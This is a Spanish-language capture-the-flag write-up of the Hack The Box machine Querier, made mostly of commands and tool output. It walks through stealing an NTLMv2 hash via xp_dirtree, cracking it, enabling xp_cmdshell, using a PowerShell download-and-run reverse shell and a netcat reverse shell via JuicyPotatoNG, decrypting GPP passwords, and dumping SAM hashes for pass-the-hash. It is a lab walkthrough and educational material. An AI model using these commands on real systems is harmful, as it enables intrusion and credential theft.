---
layout: single
title: Querier - Hack The Box
excerpt: "En este post vamos a estar haciendo la maquina Querier de la plataforma de Hack The Box mediante la enumeración de un recurso compartido por smb vamos a descargador un archivo Excel en la cual mediante marcos encontraremos una función que contiene credenciales para conectarnos al servicio MSSQL que esta corriendo en la maquina ya dentro abusaremos del xp_dirtree para hacer una petición a nuestro recurso compartido y capturar el has ntlmv2 de un usuario que vamos a crackear para conectarnos de nuevo al servicio MSSQL y abusar del xp_cmdshell y obtener una reverse shell para la escalada de privilegios vamos a usar el gpp-decrypt para obtener la contraseña en texto plano que es del administrador y como extra explotaremos el SeImpersonatePrivilege"
date: 2024-04-05
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/htb-writeup-querier/3.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:  
  - Active Directory
  - MSSQL Hash Stealing
  - SMB Enumeration
  - GPP Passwords
---

## PortScan

- Comenzamos con el escaneo de los puertos abiertos por el protocolo **TCP** y también escaneamos sus servicios que corren en los puertos.

```bash
➜  nmap sudo nmap -sCV -p135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669,49670,49671 10.129.67.247 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-05 12:44 CST
Nmap scan report for 10.129.67.247
Host is up (0.084s latency).

PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info:
|   10.129.67.247:1433:
|     Target_Name: HTB
|     NetBIOS_Domain_Name: HTB
|     NetBIOS_Computer_Name: QUERIER
|     DNS_Domain_Name: HTB.LOCAL
|     DNS_Computer_Name: QUERIER.HTB.LOCAL
|     DNS_Tree_Name: HTB.LOCAL
|_    Product_Version: 10.0.17763
| ms-sql-info:
|   10.129.67.247:1433:
|     Version:
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-04-05T18:40:54
|_Not valid after:  2054-04-05T18:40:54
|_ssl-date: 2024-04-05T18:45:35+00:00; -1s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2024-04-05T18:45:27
|_  start_date: N/A
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
```

## Enumeración

- Vemos propiedades de la maquina y el dominio al cual pertenece que es `HTB.LOCAL`.

```bash
➜  nmap crackmapexec smb 10.129.67.247
SMB         10.129.67.247   445    QUERIER          [*] Windows 10.0 Build 17763 x64 (name:QUERIER) (domain:HTB.LOCAL) (signing:False) (SMBv1:False)
```

- Si listamos recursos compartidos por **SMB** vemos que no obtenemos nada.

```bash
➜  nmap crackmapexec smb 10.129.67.247 --shares
SMB         10.129.67.247   445    QUERIER          [*] Windows 10.0 Build 17763 x64 (name:QUERIER) (domain:HTB.LOCAL) (signing:False) (SMBv1:False)
SMB         10.129.67.247   445    QUERIER          [-] Error enumerating shares: STATUS_USER_SESSION_DELETED
➜  nmap crackmapexec smb 10.129.67.247 -u 'miguelito' -p '' --shares
SMB         10.129.67.247   445    QUERIER          [*] Windows 10.0 Build 17763 x64 (name:QUERIER) (domain:HTB.LOCAL) (signing:False) (SMBv1:False)
SMB         10.129.67.247   445    QUERIER          [-] Connection Error: The NETBIOS connection with the remote host timed out.
```

- Sin embargo si lo hacemos con la herramienta `smbclient` vemos que si nos muestra los típicos.

```bash
➜  nmap smbclient -L 10.129.67.247 -N

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Reports         Disk
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.67.247 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

- Vamos a cuales si tenemos capacidad de lectura o escritura.

```bash
➜  nmap smbmap -H 10.129.67.247 -u 'null'

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)

[+] IP: 10.129.67.247:445	Name: 10.129.67.247       	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	Reports                                           	READ ONLY	
```

- Tenemos capacidad de lectura al recurso `Reports` vamos a enumerar lo que esta adentro.

```bash
➜  nmap smbmap -H 10.129.67.247 -u 'null' -r Reports

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)

[+] IP: 10.129.67.247:445	Name: 10.129.67.247       	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	Reports                                           	READ ONLY	
	./Reports
	dr--r--r--                0 Mon Jan 28 17:26:31 2019	.
	dr--r--r--                0 Mon Jan 28 17:26:31 2019	..
	fr--r--r--            12229 Mon Jan 28 17:26:31 2019	Currency Volume Report.xlsm
```

- Y bueno tenemos un `.xlsm`.

>El formato de archivo XLSM es parte de la aplicación de hoja de cálculo de Microsoft Excel. Es un formato de archivo de libro de trabajo habilitado para macros que permite a los usuarios almacenar y compartir macros y datos de hojas de cálculo.

- Vamos a emplear `smbclient` para conectarnos y descargarlo.

```bash
➜  nmap smbclient //10.129.67.247/Reports -N
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Jan 28 17:23:48 2019
  ..                                  D        0  Mon Jan 28 17:23:48 2019
  Currency Volume Report.xlsm         A    12229  Sun Jan 27 16:21:34 2019

		5158399 blocks of size 4096. 850432 blocks available
smb: \> get "Currency Volume Report.xlsm"
getting file \Currency Volume Report.xlsm of size 12229 as Currency Volume Report.xlsm (33.1 KiloBytes/sec) (average 33.1 KiloBytes/sec)
smb: \>
```

- Vamos abrirlo con `libreoffice`.

- De primeras no vemos nada.

<p align="center">
<img src="/assets/images/htb-writeup-querier/1.png">
</p>

- Pero podemos ver las macros <https://www.xataka.com/basics/macros-excel-que-como-funcionan-como-crearlos> yéndonos al apartado `Tools` y Macros.

- Podemos ver básicamente una función que se llama `Connect().`

<p align="center">
<img src="/assets/images/htb-writeup-querier/2.png">
</p>

- Se conecta a una base de datos `SQL Server` y nos comparten credenciales además de leer el contenido de la tabla `volume`.

```C
Rem Attribute VBA_ModuleType=VBADocumentModule
Option VBASupport 1

' macro to pull data for client volume reports
'
' further testing required

Private Sub Connect()

Dim conn As ADODB.Connection
Dim rs As ADODB.Recordset

Set conn = New ADODB.Connection
conn.ConnectionString = "Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6"
conn.ConnectionTimeout = 10
conn.Open

If conn.State = adStateOpen Then

  ' MsgBox "connection successful"
 
  'Set rs = conn.Execute("SELECT * @@version;")
  Set rs = conn.Execute("SELECT * FROM volume;")
  Sheets(1).Range("A1").CopyFromRecordset rs
  rs.Close

End If

End Sub

```

| Usuario   | Contraseña       |
| --------- | ---------------- |
| reporting | PcwTWTHRwryjc$c6 |


## Shell as mssql-svc

- Vamos a validar con `crackmapexec`.

```bash
➜  content crackmapexec smb 10.129.67.247 -u reporting -p 'PcwTWTHRwryjc$c6'
SMB         10.129.67.247   445    QUERIER          [*] Windows 10.0 Build 17763 x64 (name:QUERIER) (domain:HTB.LOCAL) (signing:False) (SMBv1:False)
SMB         10.129.67.247   445    QUERIER          [-] HTB.LOCAL\reporting:PcwTWTHRwryjc$c6 STATUS_NO_LOGON_SERVERS
```

- Bueno si probamos haciéndolo a nivel de `WORKGROUP` o autenticación local si nos funciona.

```bash
➜  content crackmapexec smb 10.129.67.247 -u reporting -p 'PcwTWTHRwryjc$c6' --local-auth
SMB         10.129.67.247   445    QUERIER          [*] Windows 10.0 Build 17763 x64 (name:QUERIER) (domain:QUERIER) (signing:False) (SMBv1:False)
SMB         10.129.67.247   445    QUERIER          [+] QUERIER\reporting:PcwTWTHRwryjc$c6
➜  content crackmapexec smb 10.129.67.247 -u reporting -p 'PcwTWTHRwryjc$c6' -d WORKGROUP
SMB         10.129.67.247   445    QUERIER          [*] Windows 10.0 Build 17763 x64 (name:QUERIER) (domain:WORKGROUP) (signing:False) (SMBv1:False)
SMB         10.129.67.247   445    QUERIER          [+] WORKGROUP\reporting:PcwTWTHRwryjc$c6
```

- Bueno lo que vamos hacer es que como tenemos el puerto `1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM` abierto nos vamos a conectar al servicio.

```bash
➜  content impacket-mssqlclient WORKGROUP/reporting@10.129.67.247 -windows-auth
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'volume'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)
[!] Press help for extra shell commands
SQL (QUERIER\reporting  reporting@volume)>
```

- No podemos usar `xp_cmdshell` para ejecutar comandos y tampoco podemos activarlo por que no tenemos permisos.

```bash
SQL (QUERIER\reporting  reporting@volume)> xp_cmdshell "whoami"
[-] ERROR(QUERIER): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.
SQL (QUERIER\reporting  reporting@volume)> enable xp_cmdshell
[-] ERROR(QUERIER): Line 1: Incorrect syntax near 'xp_cmdshell'.
SQL (QUERIER\reporting  reporting@volume)> enable_xp_cmdshell
[-] ERROR(QUERIER): Line 105: User does not have permission to perform this action.
[-] ERROR(QUERIER): Line 1: You do not have permission to run the RECONFIGURE statement.
[-] ERROR(QUERIER): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
[-] ERROR(QUERIER): Line 1: You do not have permission to run the RECONFIGURE statement.
```

- Lo que podemos hacer es roba el hash `NTLMv2` en el proceso de la autenticación abusando del `xp_dirtree` ya que nos permite listar recursos compartidos a nivel de red de algún servidor y nosotros desde nuestra maquina de atacante con `smbserver` vamos a crear un recurso a nivel de red para que se autentique y capturar el hash.

```bash
➜  Downloads impacket-smbserver b $(pwd) -smb2support
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

- Ahora si usamos `xp_dirtree` para listar los recursos compartidos por detrás viaja la autenticación y capturaremos el hash.

```bash
SQL (QUERIER\reporting  reporting@volume)> xp_dirtree \\10.10.15.11\smbserver
subdirectory   depth   file
------------   -----   ----
SQL (QUERIER\reporting  reporting@volume)>
```

- Capturamos el hash.

```bash
➜  Downloads impacket-smbserver b $(pwd) -smb2support
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.129.67.247,49675)
[*] AUTHENTICATE_MESSAGE (QUERIER\mssql-svc,QUERIER)
[*] User QUERIER\mssql-svc authenticated successfully
[*] mssql-svc::QUERIER:aaaaaaaaaaaaaaaa:254a4df4a95e2690a16c8afd14b68f0a:01010000000000008088a8e09187da0102326448f746e93a00000000010010004d007500590056006700510047004600030010004d00750059005600670051004700460002001000530075006f0053006b006d007900540004001000530075006f0053006b006d0079005400070008008088a8e09187da0106000400020000000800300030000000000000000000000000300000b8458b27b9ac92b92824508e47e300b1dd167c58ec5b12b4846757d2eb899f100a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310035002e0031003100000000000000000000000000
[*] Connecting Share(1:IPC$)
[-] SMB2_TREE_CONNECT not found smbserver
[-] SMB2_TREE_CONNECT not found smbserver
[*] AUTHENTICATE_MESSAGE (\,QUERIER)
[*] User QUERIER\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
[*] Disconnecting Share(1:IPC$)
[*] Closing down connection (10.129.67.247,49675)
[*] Remaining connections []
```

- Ahora vamos a crackear el hash para ver la contraseña en texto plano.

```bash
➜  content john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
corporate568     (mssql-svc)
1g 0:00:00:42 DONE (2024-04-05 13:48) 0.02369g/s 212247p/s 212247c/s 212247C/s correforenz..corococo
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

- Vamos a validar que la contraseña es valida.

```bash
➜  content crackmapexec smb 10.129.67.247 -u 'mssql-svc' -p 'corporate568' --local-auth
SMB         10.129.67.247   445    QUERIER          [*] Windows 10.0 Build 17763 x64 (name:QUERIER) (domain:QUERIER) (signing:False) (SMBv1:False)
SMB         10.129.67.247   445    QUERIER          [+] QUERIER\mssql-svc:corporate568
```

- Como el usuario se llama `mssql-svc` nos podemos conectar a `mssql` también.

```bash
➜  content impacket-mssqlclient WORKGROUP/mssql-svc@10.129.67.247 -windows-auth
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'master'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)
[!] Press help for extra shell commands
SQL (QUERIER\mssql-svc  dbo@master)>
```

- Ahora simplemente tenemos que habilitarlo para poder usar el `xp_cmdshell`.

```bash
SQL (QUERIER\mssql-svc  dbo@master)> xp_cmdshell "whoami"
[-] ERROR(QUERIER): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
```

- Vemos que ahora cambia a 1 ya podemos usarlo.

```bash
SQL (QUERIER\mssql-svc  dbo@master)> enable_xp_cmdshell
[*] INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (QUERIER\mssql-svc  dbo@master)>
```

- Ahora ya podemos ejecutar comandos.

```bash
SQL (QUERIER\mssql-svc  dbo@master)> xp_cmdshell "whoami"
output
-----------------
querier\mssql-svc

NULL

SQL (QUERIER\mssql-svc  dbo@master)>
```

- Ahora podemos ganar acceso ala maquina empleando lo siguiente <https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1>.

- Vamos a modificar el script para entablarnos una `reverse shell` directamente.

```bash
➜  content echo 'Invoke-PowerShellTcp -Reverse -IPAddress 10.10.15.11 -Port 443' >> Invoke-PowerShellTcp.ps1
➜  content cat Invoke-PowerShellTcp.ps1 | tail -n 1
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.15.11 -Port 443
```

- Vamos a ejecutar un servicio `http` con `python3` por el puerto `80`.

```bash
➜  content python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

- Y ahora nos podemos en escucha por el puerto 443 para que nos llegue la `reverse shell`.

```bash
➜  content rlwrap nc -nvlp 443
listening on [any] 443 ...
```

- Ahora usamos el `xp_cmdshell`.

```bash
SQL (QUERIER\mssql-svc  dbo@master)> xp_cmdshell "powershell IEX(New-Object Net.WebClient).downloadString(\"http://10.10.15.11/Invoke-PowerShellTcp.ps1\")"
```

- Nos llega la `reverse shell`.

```bash
➜  content rlwrap nc -nvlp 443
listening on [any] 443 ...
connect to [10.10.15.11] from (UNKNOWN) [10.129.67.247] 49677
Windows PowerShell running as user mssql-svc on QUERIER
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>whoami
querier\mssql-svc
PS C:\Windows\system32>
```

## User flag

```bash
PS C:\Windows\system32> type C:\Users\mssql-svc\Desktop\user.txt
e96e197911a391c99a71cd3596542670
PS C:\Windows\system32>
```

## Escalada de Privilegios

- Tenemos el `SeImpersonatePrivilege` `Enable` y podemos usar el <https://github.com/antonioCoco/JuicyPotatoNG> para explotarlo pero no es la principal vía para escalar privilegios de la maquina.

```bash
PS C:\Users> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

- Lo que podemos hacer para enumerar la maquina es usar <https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1>.

```bash
PS C:\Users\mssql-svc\Desktop> curl -o PowerUp.ps1 10.10.15.11/PowerUp.ps1
PS C:\Users\mssql-svc\Desktop> dir


    Directory: C:\Users\mssql-svc\Desktop


Mode                LastWriteTime         Length Name                   
----                -------------         ------ ----                   
-a----         4/5/2024   9:26 PM         600580 PowerUp.ps1            
-ar---         4/5/2024   7:41 PM             34 user.txt      
```

- Ahora importamos el modulo y lo ejecutamos.

```bash
PS C:\Users\mssql-svc\Desktop> Import-Module .\PowerUp.ps1
PS C:\Users\mssql-svc\Desktop> Invoke-AllChecks
```

- Después de ejecutarse nos da una contraseña para el usuario Administrador.

```bash
PS C:\Users\mssql-svc\Desktop> Invoke-AllChecks


Privilege   : SeImpersonatePrivilege
Attributes  : SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
TokenHandle : 780
ProcessId   : 4268
Name        : 4268
Check       : Process Token Privileges

ServiceName   : UsoSvc
Path          : C:\Windows\system32\svchost.exe -k netsvcs -p
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'
CanRestart    : True
Name          : UsoSvc
Check         : Modifiable Services

ModifiablePath    : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
IdentityReference : QUERIER\mssql-svc
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
Name              : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
Check             : %PATH% .dll Hijacks
AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'

UnattendPath : C:\Windows\Panther\Unattend.xml
Name         : C:\Windows\Panther\Unattend.xml
Check        : Unattended Install Files

Changed   : {2019-01-28 23:12:48}
UserNames : {Administrator}
NewName   : [BLANK]
Passwords : {MyUnclesAreMarioAndLuigi!!1!}
File      : C:\ProgramData\Microsoft\Group
            Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
Check     : Cached GPP Files
```

- La encontró aquí.

```bash
PS C:\Users\mssql-svc\Desktop> type "C:\ProgramData\Microsoft\Group Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml"
<?xml version="1.0" encoding="UTF-8" ?><Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
<User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="Administrator" image="2" changed="2019-01-28 23:12:48" uid="{CD450F70-CDB8-4948-B908-F8D038C59B6C}" userContext="0" removePolicy="0" policyApplied="1">
<Properties action="U" newName="" fullName="" description="" cpassword="CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ" changeLogon="0" noChange="0" neverExpires="1" acctDisabled="0" userName="Administrator"></Properties></User></Groups>
PS C:\Users\mssql-svc\Desktop>
```

- Pero si vemos la contraseña esta encriptada y se puede desencriptar con `gpp-decrypt` aunque la herramienta ya no la dio en texto plano.

```bash
➜  content gpp-decrypt CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ
MyUnclesAreMarioAndLuigi!!1!
```

- Vamos a validar la contraseña.

```bash
➜  content crackmapexec smb 10.129.67.247 -u Administrator -p 'MyUnclesAreMarioAndLuigi!!1!' --local-auth
SMB         10.129.67.247   445    QUERIER          [*] Windows 10.0 Build 17763 x64 (name:QUERIER) (domain:QUERIER) (signing:False) (SMBv1:False)
SMB         10.129.67.247   445    QUERIER          [+] QUERIER\Administrator:MyUnclesAreMarioAndLuigi!!1! (Pwn3d!)
```

- Gracias al output que nos dan **Pwn3d!** ya nos podemos conectar al servicio `winrm` empleando `evil-winrm`.

```bash
➜  content evil-winrm -i 10.129.67.247 -u Administrator -p 'MyUnclesAreMarioAndLuigi!!1!'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
querier\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

## root flag

```bash
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt
38f63aa04664d186bccca4c48252e656
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

## Explotando el SetImpersonatePrivilege

- Bueno explotar esto es muy fácil ya lo hemos echo muchas veces.

- Primero necesitamos traer ala maquina el `netcat` para Windows para ganar una `reverse shell`.

```bash
➜  content cp /usr/share/seclists/Web-Shells/FuzzDB/nc.exe .
```

```bash
PS C:\Users\mssql-svc\Desktop> curl -o nc.exe 10.10.15.11/nc.exe
PS C:\Users\mssql-svc\Desktop> dir


    Directory: C:\Users\mssql-svc\Desktop


Mode                LastWriteTime         Length Name                   
----                -------------         ------ ----                   
-a----         4/5/2024   9:39 PM          28160 nc.exe                 
-a----         4/5/2024   9:26 PM         600580 PowerUp.ps1            
-ar---         4/5/2024   7:41 PM             34 user.txt               


PS C:\Users\mssql-svc\Desktop> curl -o JuicyPotatoNG.exe 10.10.15.11/JuicyPotatoNG.exe
PS C:\Users\mssql-svc\Desktop>
```

- Ahora nos ponemos en escucha con `rlwrap` con lo habíamos hecho antes.

- Nos enviamos la `reverse shell`.

```bash
PS C:\Users\mssql-svc\Desktop> .\JuicyPotatoNG.exe -t * -p C:\Windows\System32\cmd.exe -a "/c C:\Users\mssql-svc\Desktop\nc.exe 10.10.15.11 443 -e powershell"
```

- Y ahora recibimos la `reverse shell`.

```bash
➜  content rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.15.11] from (UNKNOWN) [10.129.67.247] 49686
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\> whoami
whoami
nt authority\system
PS C:\>
```

## Dumpeando los hashes NTLM almacenados en la SAM

- Y bueno algo extra es que como tenemos las credenciales del usuario administrador podemos `dumpear` los hashes de los demás usuario para hacer `pass the hash` y conectarnos sin proporcionar contraseña.

```bash
➜  content crackmapexec smb 10.129.67.247 -u Administrator -p 'MyUnclesAreMarioAndLuigi!!1!' --local-auth --sam
SMB         10.129.67.247   445    QUERIER          [*] Windows 10.0 Build 17763 x64 (name:QUERIER) (domain:QUERIER) (signing:False) (SMBv1:False)
SMB         10.129.67.247   445    QUERIER          [+] QUERIER\Administrator:MyUnclesAreMarioAndLuigi!!1! (Pwn3d!)
SMB         10.129.67.247   445    QUERIER          [+] Dumping SAM hashes
SMB         10.129.67.247   445    QUERIER          Administrator:500:aad3b435b51404eeaad3b435b51404ee:2dcefe78334b42c0ce483b8e1b2886ab:::
SMB         10.129.67.247   445    QUERIER          Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.67.247   445    QUERIER          DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.67.247   445    QUERIER          WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:5564df813a052fce1f477bf934863870:::
SMB         10.129.67.247   445    QUERIER          mssql-svc:1001:aad3b435b51404eeaad3b435b51404ee:0ac7bd9745e85cbea2fe0fa11f33c588:::
SMB         10.129.67.247   445    QUERIER          reporting:1002:aad3b435b51404eeaad3b435b51404ee:5c8c5434d1c5cfea71d25a364adcc5e8:::
SMB         10.129.67.247   445    QUERIER          [+] Added 6 SAM hashes to the database
```

```bash
➜  content evil-winrm -i 10.129.67.247 -u Administrator -H 2dcefe78334b42c0ce483b8e1b2886ab

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
querier\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```
